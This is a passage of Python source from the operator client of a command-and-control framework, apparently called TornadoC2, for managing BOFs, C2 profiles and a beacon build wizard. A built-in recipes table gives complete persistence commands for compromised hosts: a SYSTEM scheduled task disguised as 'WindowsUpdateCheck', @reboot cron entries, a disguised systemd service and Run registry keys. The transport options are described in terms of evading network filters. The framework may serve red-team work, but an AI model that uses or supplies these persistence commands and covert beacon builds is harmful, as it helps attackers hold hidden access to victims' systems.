                  f"or a directory containing them.{c['reset']}")
            return

        print(f"{c['red']}unknown bofs subcommand: {sub}"
              f"{c['reset']}")

    def _bofs_list(self):
        c = CLR
        try:
            r = self.tp.post('/api/v1/bofs', {})
        except Exception as exc:
            print(f"{c['red']}bofs list failed: {exc}{c['reset']}")
            return
        rows = r.get('bofs') or []
        if not rows:
            print(f"  {c['dim']}(no BOFs registered){c['reset']}")
            print(f"  {c['dim']}add one with: "
                  f"bofs add <path>{c['reset']}")
            return

        _header(f'BOFS  ·  {len(rows)} registered')
        for row in rows:
            name = row['name']
            arch = row.get('arch', '?')
            fmt = row.get('format') or '-'
            size = row.get('size', 0)
            sha = (row.get('sha256') or '')[:16]
            desc = row.get('description') or ''
            missing = bool(row.get('missing'))

            flag = (f" {c['red']}(missing){c['reset']}"
                    if missing else '')
            print(f"  {c['cyan']}{name:<24}{c['reset']} "
                  f"{c['dim']}arch={arch:<4} "
                  f"fmt={fmt:<6} "
                  f"{_human_bytes(size):>8}  "
                  f"sha256={sha}…{c['reset']}{flag}")
            if desc:
                print(f"      {c['dim']}{desc}{c['reset']}")

        print()
        print(f"  {c['dim']}run on a beacon with:  "
              f"bof <local_path.o>  (client-side dispatch still "
              f"reads the local file){c['reset']}")
        print()

    def _bofs_remove(self, name):
        c = CLR
        try:
            ans = input(
                f"  {c['yellow']}remove BOF {name!r}? "
                f"Other operators will not be able to run it. "
                f"[y/N]{c['reset']} "
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if ans not in ('y', 'yes'):
            print(f"{c['dim']}cancelled{c['reset']}")
            return

        try:
            r = self.tp.post('/api/v1/bofs/remove', {'name': name})
        except Exception as exc:
            print(f"{c['red']}bofs remove failed: {exc}"
                  f"{c['reset']}")
            return
        if not r.get('ok'):
            print(f"{c['red']}{r.get('error', 'failed')}"
                  f"{c['reset']}")
            return
        print(f"{c['green']}✓{c['reset']} removed {c['cyan']}{name}"
              f"{c['reset']}")

    def _bofs_add(self, path, as_name, replace):
        c = CLR
        try:
            from .bof_loader import build_upload_payloads
        except ImportError as exc:
            print(f"{c['red']}bof_loader module unavailable: {exc}"
                  f"{c['reset']}")
            return

        try:
            payloads = build_upload_payloads(path, replace=replace)
        except ValueError as exc:
            print(f"{c['red']}{exc}{c['reset']}")
            return

        if as_name is not None:
            if len(payloads) != 1:
                print(f"{c['red']}--as requires a single object "
                      f"({len(payloads)} found){c['reset']}")
                return
            payloads[0]['name'] = as_name

        if not payloads:
            print(f"{c['red']}nothing to upload{c['reset']}")
            return

        print(f"{c['cyan']}[*]{c['reset']} uploading "
              f"{len(payloads)} BOF(s) from {path}")
        ok = 0
        for p in payloads:
            try:
                r = self.tp.post('/api/v1/bofs/add', p)
            except Exception as exc:
                print(f"  {c['red']}✗{c['reset']} "
                      f"{p['name']}: {exc}")
                continue
            if not r.get('ok'):
                print(f"  {c['red']}✗{c['reset']} "
                      f"{p['name']}: {r.get('error', 'failed')}")
                continue
            replaced = r.get('replaced')
            note = (f" {c['yellow']}(replaced){c['reset']}"
                    if replaced else '')
            print(f"  {c['green']}✓{c['reset']} "
                  f"{c['cyan']}{p['name']:<24}{c['reset']} "
                  f"arch={r.get('arch','?')} "
                  f"{_human_bytes(int(r.get('size', 0)))}"
                  f"{note}")
            ok += 1

        if ok:
            print(f"{c['green']}registered {ok}/{len(payloads)}"
                  f"{c['reset']}")

    def _cmd_c2_profiles(self, parts):
        """c2-profiles [<name>]

        No argument: list every C2 profile the server can build
        against, with the fields an operator needs to pick one.
        With a name: print that profile's full JSON so it can be
        copied as a starting point for a new profile or pasted into
        a build config.
        """
        c = CLR
        requested = parts[1] if len(parts) > 1 else None
        payload = {}
        if requested:
            payload['name'] = requested

        try:
            r = self.tp.post('/api/v1/c2-profiles', payload)
        except Exception as exc:
            print(f"{c['red']}c2-profiles fetch failed: {exc}"
                  f"{c['reset']}")
            return

        # ---- Single-profile view ------------------------------------
        if requested:
            prof = r.get('profile')
            if not isinstance(prof, dict):
                print(f"{c['red']}server returned no profile"
                      f"{c['reset']}")
                return
            _header(f'C2 PROFILE  ·  {requested}')
            print()
            print(json.dumps(prof, indent=2, sort_keys=True))
            print()
            print(f"  {c['dim']}use: --c2-profile {requested}  |  "
                  f"or \"c2_profile\": \"{requested}\" in a "
                  f"config file{c['reset']}")
            print()
            return

        # ---- List view ----------------------------------------------
        rows = r.get('profiles') or []
        if not rows:
            print(f"  {c['dim']}(no C2 profiles on the server)"
                  f"{c['reset']}")
            print(f"  {c['dim']}profiles live under profiles/c2/ "
                  f"on the server{c['reset']}")
            return

        _header(f'C2 PROFILES  ·  {len(rows)}')

        for p in rows:
            name = p.get('name', '?')
            desc = p.get('description') or ''
            ua = p.get('user_agent') or ''
            bp = p.get('beacon_path', '/beacon')
            tp = p.get('tasks_path', '/tasks')
            rp = p.get('results_path', '/results')
            shaping = p.get('shaping_kinds') or []

            print(f"  {c['cyan']}{name}{c['reset']}", end='')
            if desc:
                print(f"  {c['dim']}{desc}{c['reset']}")
            else:
                print()

            ua_short = ua[:64] + ('…' if len(ua) > 64 else '')
            if ua_short:
                print(f"    {c['dim']}ua     : {c['reset']}"
                      f"{ua_short}")
            else:
                print(f"    {c['dim']}ua     : {c['reset']}"
                      f"(built-in default)")

            paths_line = f"{bp}  {tp}  {rp}"
            print(f"    {c['dim']}paths  : {c['reset']}{paths_line}")

            if shaping:
                print(f"    {c['green']}shaping: {c['reset']}"
                      f"{', '.join(shaping)}")
            print()

        print(f"  {c['dim']}show one profile's full JSON:  "
              f"c2-profiles <name>{c['reset']}")
        print(f"  {c['dim']}use in a build:  "
              f"--c2-profile <name>  |  \"c2_profile\": \"<name>\""
              f"{c['reset']}")
        print()

    # ------------------------------------------------------------------
    # Operator recipes

    _RECIPES = {
        'schtask': {
            'title': 'Windows — scheduled task (schtasks.exe)',
            'category': 'PERSISTENCE',
            'summary': (
                'Creates a scheduled task that runs a payload on every '
                'logon as SYSTEM. Scheduled tasks are visible to '
                '`schtasks /query`, to Defender\'s AMSI-aware tasking '
                'telemetry, and to Sysmon EventID 1 when the task fires. '
                'Consider the task name carefully — it is the first '
                'thing an analyst reads.'
            ),
            'lines': [
                ('Create (onlogon, SYSTEM, hidden)',
                 'sh schtasks /create /tn "WindowsUpdateCheck" '
                 '/tr "C:\\\\Windows\\\\Temp\\\\svc.exe" '
                 '/sc onlogon /ru SYSTEM /rl HIGHEST /f'),
                ('Create (repeating, every 30 min)',
                 'sh schtasks /create /tn "WindowsUpdateCheck" '
                 '/tr "C:\\\\Windows\\\\Temp\\\\svc.exe" '
                 '/sc minute /mo 30 /ru SYSTEM /f'),
                ('Verify',
                 'sh schtasks /query /tn "WindowsUpdateCheck" '
                 '/v /fo LIST'),
                ('Remove',
                 'sh schtasks /delete /tn "WindowsUpdateCheck" /f'),
            ],
        },
        'cron': {
            'title': 'Linux — cron entries (user and system)',
            'category': 'PERSISTENCE',
            'summary': (
                'A user crontab runs as the beacon\'s user; '
                '/etc/cron.d entries run as whichever user the entry '
                'names. User crontabs are invisible to `cat /etc/cron*`; '
                'a defender who only reads the system-wide directories '
                'misses them. Both are auditable via auditd on the '
                'write() that appends the crontab.'
            ),
            'lines': [
                ('User crontab — append without clobbering',
                 'sh (crontab -l 2>/dev/null; echo '
                 '"@reboot /tmp/.svc &") | crontab -'),
                ('User crontab — verify',
                 'sh crontab -l'),
                ('User crontab — remove all',
                 'sh crontab -r'),
                ('System — /etc/cron.d entry',
                 'sh sh -c \'printf "%s\\n" '
                 '"@reboot root /usr/local/bin/svc" '
                 '> /etc/cron.d/updatesvc\''),
                ('System — verify',
                 'sh cat /etc/cron.d/updatesvc'),
                ('System — remove',
                 'sh rm -f /etc/cron.d/updatesvc'),
            ],
        },
        'systemd-unit': {
            'title': 'Linux — systemd service unit',
            'category': 'PERSISTENCE',
            'summary': (
                'A unit under /etc/systemd/system requires a '
                'daemon-reload, which forks systemctl. That call is '
                'the loudest part of this recipe and the one a host '
                'integrity monitor keys on. If the target has no '
                'systemd, use the cron recipe instead.'
            ),
            'lines': [
                ('Write the unit (heredoc through sh)',
                 'sh sh -c \'cat > /etc/systemd/system/updatesvc.service '
                 '<<\'EOF\'\n'
                 '[Unit]\n'
                 'Description=System Update Service\n'
                 'After=network.target\n'
                 '\n'
                 '[Service]\n'
                 'Type=simple\n'
                 'ExecStart=/usr/local/bin/svc\n'
                 'Restart=always\n'
                 'RestartSec=10\n'
                 '\n'
                 '[Install]\n'
                 'WantedBy=multi-user.target\n'
                 'EOF\''),
                ('Reload and enable',
                 'sh systemctl daemon-reload && '
                 'systemctl enable --now updatesvc.service'),
                ('Verify',
                 'sh systemctl status updatesvc.service'),
                ('Remove',
                 'sh systemctl disable --now updatesvc.service && '
                 'rm -f /etc/systemd/system/updatesvc.service && '
                 'systemctl daemon-reload'),
            ],
        },
        'run-key': {
            'title': 'Windows — userinit / Run registry keys',
            'category': 'PERSISTENCE',
            'summary': (
                'Per-user Run key persists under the beacon\'s user. '
                'HKLM requires admin. Both are visible in `reg query` '
                'and in the Sysmon registry-write event.'
            ),
            'lines': [
                ('Per-user (HKCU)',
                 'sh reg add '
                 '"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\'
                 'CurrentVersion\\\\Run" /v SysHelper /t REG_SZ '
                 '/d "C:\\\\Windows\\\\Temp\\\\svc.exe" /f'),
                ('Machine (HKLM, admin)',
                 'sh reg add '
                 '"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\'
                 'CurrentVersion\\\\Run" /v SysHelper /t REG_SZ '
                 '/d "C:\\\\Windows\\\\Temp\\\\svc.exe" /f'),
                ('Verify',
                 'sh reg query '
                 '"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\'
                 'CurrentVersion\\\\Run" /v SysHelper'),
                ('Remove',
                 'sh reg delete '
                 '"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\'
                 'CurrentVersion\\\\Run" /v SysHelper /f'),
            ],
        },
    }

    def _cmd_recipes(self, parts):
        """recipes [list | <name>]

        Operator reference material — persistence and common
        post-exploitation patterns to run via `sh`. These are
        deliberately not first-class verbs: the moment a framework
        ships `persist --method schtask`, leaving a persistence
        artefact becomes a framework feature rather than an
        operator decision. The recipe form keeps the moment of
        friction where it belongs.
        """
        c = CLR
        sub = parts[1].lower() if len(parts) > 1 else 'list'

        if sub in ('list', 'ls', ''):
            _header('RECIPES')
            by_cat = {}
            for name, rec in self._RECIPES.items():
                by_cat.setdefault(rec['category'], []).append(
                    (name, rec['title']))
            for cat in sorted(by_cat):
                print()
                print(f"  {c['cyan']}{cat}{c['reset']}")
                for name, title in sorted(by_cat[cat]):
                    print(f"    {c['green']}{name:<14}"
                          f"{c['reset']}  {title}")
            print()
            print(f"  {c['dim']}show one:  recipes <name>"
                  f"{c['reset']}")
            print(f"  {c['dim']}these recipes are meant to be "
                  f"typed into an attached beacon; the `sh` verb "
                  f"pipes the command through stdin so it does "
                  f"not appear in argv on the target.{c['reset']}")
            print()
            return

        rec = self._RECIPES.get(sub)
        if rec is None:
            print(f"{c['red']}unknown recipe: {sub}{c['reset']}")
            print(f"  {c['dim']}run `recipes` for the list"
                  f"{c['reset']}")
            return

        _header(f"{rec['title']}")
        print()
        print(f"  {c['dim']}{rec['category']}{c['reset']}")
        print()
        for line in rec['summary'].splitlines():
            print(f"  {c['yellow']}{line}{c['reset']}")
        print()

        for label, cmd in rec['lines']:
            print(f"  {c['cyan']}{label}{c['reset']}")
            print(f"    {c['green']}{cmd}{c['reset']}")
            print()

        print(f"  {c['dim']}attach to a beacon first; each "
              f"`sh` line is one task.{c['reset']}")
        print()

    # ------------------------------------------------------------------
    # Remote build

    def _cmd_build(self, parts):
        """build | build -c <config.json>

        Triggers a build on the team server. The server compiles
        the agent and streams the binary back; the client writes
        it to beacon_output/ locally.

        Two forms:

            build                  interactive wizard
            build -c <file.json>   non-interactive from a config
                                   file

        There is no flag-based build path on the remote client.
        The flag parser (`build linux amd64 --transport smb`) is a
        convenience of the local console on the team server, where
        the operator is already at a shell on the same host. On the
        remote client every parameter travels through the JSON
        config, so a build submitted here and a build submitted
        from the local console produce the same `_load_build_config`
        payload — which is what the server-side path whitelist and
        transport consistency checks are written against.
        """
        args = parts[1:]

        if args and args[0] in ('-c', '--config'):
            if len(args) < 2:
                print(f"{CLR['red']}usage: build -c <file.json>"
                      f"{CLR['reset']}")
                return
            cfg_path = args[1]
            if not os.path.isfile(cfg_path):
                print(f"{CLR['red']}config not found: {cfg_path}"
                      f"{CLR['reset']}")
                return
            try:
                with open(cfg_path, 'r', encoding='utf-8') as fh:
                    import json as _json
                    payload = _json.load(fh)
            except (OSError, ValueError) as exc:
                print(f"{CLR['red']}read failed: {exc}{CLR['reset']}")
                return
            self._do_remote_build(payload)
            return

        if args:
            print(f"{CLR['red']}build: unexpected arguments: "
                  f"{' '.join(args)}{CLR['reset']}")
            print()
            print(f"  {CLR['dim']}the remote client has two build "
                  f"paths:{CLR['reset']}")
            print(f"    {CLR['cyan']}build{CLR['reset']}                "
                  f"interactive wizard")
            print(f"    {CLR['cyan']}build -c <file.json>{CLR['reset']}  "
                  f"non-interactive from a config file")
            print()
            print(f"  {CLR['dim']}the flag parser "
                  f"(`beacon-build <os> <arch> --transport ...`) "
                  f"is a convenience of the local console on the "
                  f"team server. On the remote client, see "
                  f"README.md › Build Config File for the JSON "
                  f"schema.{CLR['reset']}")
            print()
            print(f"  {CLR['dim']}SMB, TCP bind, and TCP reverse "
                  f"configs additionally need a server-side pivot "
                  f"keypair. Set {CLR['reset']}{CLR['cyan']}"
                  f"\"pivot_key_path\": \"mtls_certs/pivot.pem\""
                  f"{CLR['reset']}{CLR['dim']} in the JSON, or run "
                  f"the wizard and let it prompt.{CLR['reset']}")
            return

        payload = self._build_wizard()
        if payload is None:
            print(f"{CLR['yellow']}build cancelled{CLR['reset']}")
            return
        self._do_remote_build(payload)

    def _build_wizard(self):
        """Interactive build wizard.

        A state machine over an ordered list of sections. Each section
        returns a value, 'BACK' to return to the previous section, or
        'CANCEL' to abort. Sections that do not apply given the
        accumulated state are silently skipped.

        At every prompt the operator can type:
            <enter>     accept the default
            <value>     accept the typed value
            b / back    return to the previous section
            q / cancel  abort the whole wizard
        """
        c = CLR

        # ------------------------------------------------------------------
        # Input helpers. Each returns a string (or bool), or the sentinel
        # 'BACK' / 'CANCEL'.

        def _handle(raw):
            low = raw.strip().lower()
            if low in ('q', 'quit', 'cancel'):
                return 'CANCEL'
            if low in ('b', 'back'):
                return 'BACK'
            return None

        def ask(prompt, default='', validate=None, hint=None):
            suffix = f" [{default}]" if default else ''
            if hint:
                print(f"  {c['yellow']}{hint}{c['reset']}")
            while True:
                try:
                    raw = input(
                        f"  {c['green']}▸{c['reset']} "
                        f"{prompt}{suffix}: ")
                except (EOFError, KeyboardInterrupt):
                    print()
                    return 'CANCEL'
                sentinel = _handle(raw)
                if sentinel:
                    return sentinel
                value = raw.strip() or default
                if validate is not None:
                    problem = validate(value)
                    if problem:
                        print(f"  {c['red']}✗ {problem}{c['reset']}")
                        continue
                return value

        def ask_yes(prompt, default=False):
            marker = 'Y/n' if default else 'y/N'
            while True:
                try:
                    raw = input(
                        f"  {c['green']}▸{c['reset']} "
                        f"{prompt} [{marker}]: ")
                except (EOFError, KeyboardInterrupt):
                    print()
                    return 'CANCEL'
                sentinel = _handle(raw)
                if sentinel:
                    return sentinel
                low = raw.strip().lower()
                if low == '':
                    return default
                if low in ('y', 'yes'):
                    return True
                if low in ('n', 'no'):
                    return False
                print(f"  {c['red']}✗ enter y or n{c['reset']}")

        def choose(title, options, default_index=0):
            """options: list of (value, label, description_or_None)."""
            print(f"\n  {c['cyan']}{c['bold']}{title}{c['reset']}")
            for i, (_v, label, desc) in enumerate(options, 1):
                marker = '●' if (i - 1) == default_index else ' '
                d = (f"  {c['yellow']}— {desc}{c['reset']}"
                     if desc else '')
                print(f"    {marker} {i}. {label}{d}")
            while True:
                try:
                    raw = input(
                        f"  {c['green']}▸ Choice "
                        f"[{default_index + 1}]{c['reset']} "
                        f"{c['dim']}(b=back, q=cancel){c['reset']}: ")
                except (EOFError, KeyboardInterrupt):
                    print()
                    return 'CANCEL'
                low = raw.strip().lower()
                if low in ('q', 'quit', 'cancel'):
                    return 'CANCEL'
                if low in ('b', 'back'):
                    return 'BACK'
                if low == '':
                    return options[default_index][0]
                try:
                    idx = int(low) - 1
                except ValueError:
                    print(f"  {c['red']}✗ enter a number between 1 "
                          f"and {len(options)}{c['reset']}")
                    continue
                if 0 <= idx < len(options):
                    return options[idx][0]
                print(f"  {c['red']}✗ out of range{c['reset']}")

        # ------------------------------------------------------------------
        # Validators used in more than one section.

        def _is_https(v):
            return None if v.startswith('https://') \
                else 'must start with https://'

        def _is_ipv4(v):
            parts = v.split('.')
            if len(parts) != 4:
                return 'must be a dotted-quad IPv4 (a.b.c.d)'
            for p in parts:
                if not p.isdigit() or not (0 <= int(p) <= 255):
                    return f'{p!r} is not a valid octet'
            return None

        def _is_zone(v):
            return None if '.' in v and ' ' not in v \
                else 'must look like a domain name (c2.example.com)'

        def _is_hex64(v):
            if len(v) != 64:
                return 'must be exactly 64 hex characters'
            for ch in v.lower():
                if ch not in '0123456789abcdef':
                    return 'must be lowercase or uppercase hex'
            return None

        def _is_nonneg_int(v):
            if not v.isdigit():
                return 'must be a non-negative integer'
            return None

        def _is_stage_name(v):
            if not v:
                return 'required for stager builds'
            ok = all(ch.isalnum() or ch in '-_.' for ch in v)
            return None if ok else \
                'letters, digits, dash, underscore, dot only'

        # ------------------------------------------------------------------
        # Sections. Each returns a value, or a sentinel, or None.
        # Sections that fill more than one key mutate `state` directly
        # and return None.

        def section_os(state):
            return choose(
                'Target OS',
                [
                    ('linux',   'linux',
                    'ELF binary — shells, servers, containers'),
                    ('windows', 'windows',
                    'PE binary — workstations, servers'),
                ], 0)

        def section_arch(state):
            opts = [
                ('amd64', 'amd64', 'x86-64 (most common)'),
                ('arm64', 'arm64', 'AArch64 (modern servers)'),
            ]
            if state.get('os') == 'windows':
                opts.append(
                    ('386', '386', '32-bit x86 (Windows only)'))
            return choose('Architecture', opts, 0)

        def section_format(state):
            common = [
                ('shellcode', 'shellcode',
                'position-independent via Donut'),
                ('stager', 'stager',
                'minimal first stage; fetches the full agent'),
            ]
            if state.get('os') == 'windows':
                opts = [
                    ('exe', 'exe', 'Windows PE executable'),
                    ('dll', 'dll', 'Windows DLL (sideloading)'),
                ] + common
            else:
                opts = [
                    ('elf', 'elf', 'plain ELF executable'),
                ] + common
            return choose('Output format', opts, 0)

        def section_stager_name(state):
            return ask(
                'Payload name to fetch on check-in (e.g. "full")',
                validate=_is_stage_name,
                hint=('the payload stem under payloads/ on the '
                    'server; the AES key is recorded against '
                    'this name in payloads/stage_keys.json'))

        def section_stager_key(state):
            v = ask(
                'AES-256 key (64 hex chars; blank = generate)',
                validate=lambda s: None if not s else _is_hex64(s),
                hint=('leave blank to have the server generate a '
                    'fresh key per build'))
            return v

        # ---- 4. Transport mode -------------------------------------
        #
        # Each entry is (transport_mode, label, description).
        # Adding a new transport to the wizard is one entry here
        # plus one conditional block in `section_transport_opts`
        # and/or `section_endpoint` for any transport-specific
        # prompts, one row in `section_confirm` for the summary,
        # and one branch in the payload assembly at the end of
        # this function that copies the new fields into the dict
        # the server's _load_build_config reads.
        #
        # The framework-side work to add a transport is documented
        # in README.md › Extending TornadoC2 › Adding a transport
        # — two classes plus mechanical glue across seven files.
        # The wizard itself only needs the display label, the
        # transport_mode value, and the per-transport prompt
        # blocks; it does not touch the transport implementation.

        def section_transport(state):
            opts = [
                ('http', 'http',
                'HTTPS + JSON — default; needs a reachable URL'),
                ('quic', 'quic',
                'QUIC / HTTP/3 over UDP — same JSON protocol '
                'as HTTP, different carriage. Reaches networks '
                'that permit HTTP/3 but block or proxy direct '
                'TCP. Needs a reachable URL.'),
                ('websocket', 'websocket',
                'WebSocket over TLS (wss://) — one connection '
                'per check-in cycle. Blends with modern browser '
                'and SaaS traffic. Needs a reachable URL; the '
                'https:// scheme is converted to wss:// at dial '
                'time.'),
                ('dns', 'dns',
                'UDP DNS TXT — needs an authoritative zone'),
                ('doh', 'doh',
                'DNS over HTTPS — blends with browser DoH; '
                'escapes UDP/53 filters'),
                ('wireguard', 'wireguard',
                'WireGuard UDP tunnel — C2 runs over a userspace '
                'WireGuard device. Needs the server\'s WireGuard '
                'public key and a pre-generated agent keypair. '
                'Reaches networks that permit UDP/51820 but '
                'filter TCP.'),
                ('http,dns', 'http + dns',
                'HTTPS primary, rotate to UDP DNS after N failures'),
                ('http,doh', 'http + doh',
                'HTTPS primary, rotate to DoH after N failures'),
                ('dns,doh', 'dns + doh',
                'UDP DNS primary, rotate to DoH after N failures'),
            ]
            if state.get('os') == 'windows':
                opts.append(
                    ('smb', 'smb',
                    'Windows named pipe; a parent beacon relays it'))
            if state.get('os') == 'linux':
                opts.append(
                    ('icmp', 'icmp',
                    'ICMP echo — Linux only; requires CAP_NET_RAW on '
                    'the C2 host'))
            opts.append(
                ('tcp', 'tcp',
                'TCP listener; a parent beacon dials in'))
            opts.append(
                ('tcprev', 'tcp-reverse',
                'TCP reverse — the child dials out to a parent '
                'that is listening on a TCP port. Inverse of tcp: '
                'the parent listens, the child connects. Use when '
                'the child can reach the parent\'s network but the '
                'parent cannot reach the child.'))
            return choose('Transport', opts, 0)

        def section_transport_opts(state):
            """Everything the chosen transport needs beyond its name.
            Fills multiple state keys and returns None."""
            modes = state['transport'].split(',')

            if 'wireguard' in modes:
                print(f"    {c['dim']}the handler prints its "
                    f"WireGuard public key at startup. Copy "
                    f"that value here. Generate an agent keypair "
                    f"on the server with "
                    f"`wg genkey | tee agent.key | wg pubkey`; "
                    f"paste the private half here and pin the "
                    f"public half after deployment with "
                    f"`wireguard add-peer`.{c['reset']}")
                v = ask('Server WireGuard public key (base64)')
                if v in ('BACK', 'CANCEL'):
                    return v
                if not v.strip():
                    print(f"    {c['red']}a server public key "
                        f"is required{c['reset']}")
                    return 'BACK'
                state['wireguard_server_pubkey'] = v.strip()

                v = ask('Server UDP address (host:port)')
                if v in ('BACK', 'CANCEL'):
                    return v
                if not v.strip():
                    print(f"    {c['red']}a server address is "
                        f"required{c['reset']}")
                    return 'BACK'
                state['wireguard_server_addr'] = v.strip()

                v = ask('Agent WireGuard private key (base64)')
                if v in ('BACK', 'CANCEL'):
                    return v
                if not v.strip():
                    print(f"    {c['red']}an agent private key "
                        f"is required{c['reset']}")
                    return 'BACK'
                state['wireguard_agent_privkey'] = v.strip()

                v = ask('Agent tunnel IPv4 (10.99.0.2 for the '
                        'first agent; increment per agent)',
                        '10.99.0.2', validate=_is_ipv4)
                if v in ('BACK', 'CANCEL'):
                    return v
                state['wireguard_tunnel_ip'] = v

                print(f"    {c['dim']}the server's address "
                    f"inside the tunnel. Must match the "
                    f"handler's --wireguard-server-ip value; "
                    f"the default is 10.99.0.1. Only change this "
                    f"if the handler was started with a "
                    f"non-default --wireguard-server-ip.{c['reset']}")
                v = ask('Server tunnel IPv4', '10.99.0.1',
                        validate=_is_ipv4)
                if v in ('BACK', 'CANCEL'):
                    return v
                state['wireguard_server_tunnel_ip'] = v

                print(f"    {c['dim']}the HTTPS port the agent "
                    f"dials inside the tunnel. Must match the "
                    f"handler's --beacon-port. Defaults to "
                    f"8881.{c['reset']}")
                v = ask(
                    'Inner HTTPS port', '8881',
                    validate=lambda s: (
                        None if (s.isdigit()
                                 and 1 <= int(s) <= 65535)
                        else 'must be a port number 1-65535'))
                if v in ('BACK', 'CANCEL'):
                    return v
                state['wireguard_inner_port'] = v
                return None

            if 'smb' in modes:
                print(f"    {c['dim']}The parent must be built "
                      f"with the same pipe name (without any "
                      f"path prefix). Two forms:{c['reset']}")
                print(f"      {c['cyan']}tornado_relay_001"
                      f"{c['reset']}  — same-host pivot; "
                      f"the child opens a local pipe")
                print(f"      {c['cyan']}\\\\WIN-SRV2\\pipe\\"
                      f"tornado_relay_001{c['reset']}  — "
                      f"cross-host pivot; the child opens a pipe "
                      f"on WIN-SRV2 over SMB. WIN-SRV2 must be "
                      f"resolvable from the child and reachable "
                      f"on TCP/445.")
                print(f"    {c['dim']}On bash, single-quote the "
                      f"UNC form so the shell does not collapse "
                      f"the leading backslashes.{c['reset']}")
                v = ask('Pipe name or UNC path',
                        'tornado_relay_001')
                if v in ('BACK', 'CANCEL'):
                    return v
                state['smb_pipe'] = v
                return None

            if 'tcp' in modes:
                v = ask('Listen address', '0.0.0.0:4444')
                if v in ('BACK', 'CANCEL'):
                    return v
                state['tcp_bind_addr'] = v
                tok = ask('Auth token (64 hex chars; blank = generate)')
                if tok in ('BACK', 'CANCEL'):
                    return tok
                if tok:
                    if _is_hex64(tok):
                        print(f"    {c['red']}{_is_hex64(tok)}"
                            f"{c['reset']}")
                        return 'BACK'
                    state['tcp_bind_token'] = tok
                else:
                    import secrets as _sec
                    state['tcp_bind_token'] = _sec.token_hex(32)
                    print(f"    {c['cyan']}generated: "
                        f"{c['bold']}{state['tcp_bind_token']}"
                        f"{c['reset']}")
                    print(f"    {c['dim']}use this on the parent's "
                        f"--tcp-relay-token{c['reset']}")
                return None

            if 'tcprev' in modes:
                print(f"    {c['dim']}The child dials out to a "
                    f"parent that is listening on a TCP port. "
                    f"The parent must be built with "
                    f"--tcp-rev-listen set to a port the child "
                    f"can reach.{c['reset']}")
                v = ask(
                    'Parent listener host:port as reachable '
                    'from this child',
                    '10.0.0.5:4444')
                if v in ('BACK', 'CANCEL'):
                    return v
                if ':' not in v:
                    print(f"    {c['red']}must be host:port "
                        f"(e.g. 10.0.0.5:4444){c['reset']}")
                    return 'BACK'
                state['tcp_rev_target'] = v
                tok = ask(
                    'Auth token (64 hex chars, from the '
                    'parent build)')
                if tok in ('BACK', 'CANCEL'):
                    return tok
                if not tok.strip():
                    print(f"    {c['red']}a token is required — "
                        f"generate one on the parent side and "
                        f"paste it here{c['reset']}")
                    return 'BACK'
                if _is_hex64(tok):
                    print(f"    {c['red']}{_is_hex64(tok)}"
                        f"{c['reset']}")
                    return 'BACK'
                state['tcp_rev_token'] = tok
                return None

            if state.get('os') == 'windows' and 'smb' not in modes:
                v = ask('SMB relay pipe name (blank = skip)', '')
                if v in ('BACK', 'CANCEL'):
                    return v
                if v:
                    state['smb_relay_pipe'] = v

            if 'tcp' not in modes:
                v = ask('TCP relay target host:port (blank = skip)', '')
                if v in ('BACK', 'CANCEL'):
                    return v
                if v:
                    state['tcp_relay_target'] = v
                    tok = ask('TCP relay auth token (must match child)')
                    if tok in ('BACK', 'CANCEL'):
                        return tok
                    state['tcp_relay_token'] = tok

            if 'tcprev' not in modes:
                v = ask(
                    'TCP reverse listen address host:port '
                    '(blank = skip)', '')
                if v in ('BACK', 'CANCEL'):
                    return v
                v = v.strip()
                if v:
                    if ':' not in v:
                        print(f"    {c['red']}must be host:port "
                            f"(e.g. 0.0.0.0:4444){c['reset']}")
                        return 'BACK'
                    state['tcp_rev_listen'] = v
                    tok = ask(
                        'TCP reverse token (64 hex; blank = '
                        'generate)')
                    if tok in ('BACK', 'CANCEL'):
                        return tok
                    tok = tok.strip()
                    if not tok:
                        import secrets as _sec
                        tok = _sec.token_hex(32)
                        print(f"    {c['cyan']}generated reverse "
                            f"token: {c['bold']}{tok}"
                            f"{c['reset']}")
                        print(f"    {c['yellow']}Rebuild the child "
                            f"with --tcp-rev-token {tok} before "
                            f"deploying this parent.{c['reset']}")
                    elif _is_hex64(tok):
                        print(f"    {c['red']}{_is_hex64(tok)}"
                            f"{c['reset']}")
                        return 'BACK'
                    state['tcp_rev_token'] = tok

            if len(modes) > 1:
                v = ask('Rotate after N consecutive failures', '3',
                        validate=_is_nonneg_int)
                if v in ('BACK', 'CANCEL'):
                    return v
                state['transport_failover_after'] = int(v)

            return None

        def section_endpoint(state):
            modes = state['transport'].split(',')

            if ('http' in modes or 'quic' in modes
                    or 'websocket' in modes):
                quic_only = ('quic' in modes
                             and 'http' not in modes
                             and 'websocket' not in modes)
                if quic_only and self.quic_port:
                    port = self.quic_port
                else:
                    port = (getattr(self, 'beacon_port', None)
                            or 8881)
                default_url = (
                    f"https://{self.cfg['server_host']}:{port}")
                v = ask('Callback URL', default_url,
                        validate=_is_https)
                if v in ('BACK', 'CANCEL'):
                    return v
                state['url'] = v

            if 'dns' in modes or 'doh' in modes:
                v = ask('Authoritative zone', 'c2.example.com',
                        validate=_is_zone)
                if v in ('BACK', 'CANCEL'):
                    return v
                state['dns_domain'] = v

            if 'dns' in modes:
                v = ask('UDP resolver host:port (blank = system)', '')
                if v in ('BACK', 'CANCEL'):
                    return v
                if v:
                    state['dns_resolver'] = v

            if 'doh' in modes:
                print(f"    {c['dim']}DoH posts the DNS query to a "
                    f"public resolver over HTTPS. Cloudflare is "
                    f"the Firefox default; dns.google is the "
                    f"Chrome default.{c['reset']}")
                v = ask('DoH endpoint URL',
                        'https://cloudflare-dns.com/dns-query',
                        validate=_is_https)
                if v in ('BACK', 'CANCEL'):
                    return v
                state['doh_resolver'] = v
                v = ask('DoH Host header override (blank = none)', '')
                if v in ('BACK', 'CANCEL'):
                    return v
                if v:
                    state['doh_host_header'] = v

            if 'icmp' in modes:
                print(f"    {c['dim']}the C2's public IPv4. The "
                    f"server needs CAP_NET_RAW on the Python "
                    f"process; see the README for the setcap "
                    f"line.{c['reset']}")
                v = ask('C2 IPv4 address', validate=_is_ipv4)
                if v in ('BACK', 'CANCEL'):
                    return v
                state['icmp_host'] = v

            return None

        def section_pivot_key(state):
            """Path to the engagement-wide pivot keypair file on
            the **server**.

            Fixed at ``mtls_certs/pivot.pem``. The team server
            refuses any other value from a remote operator, so
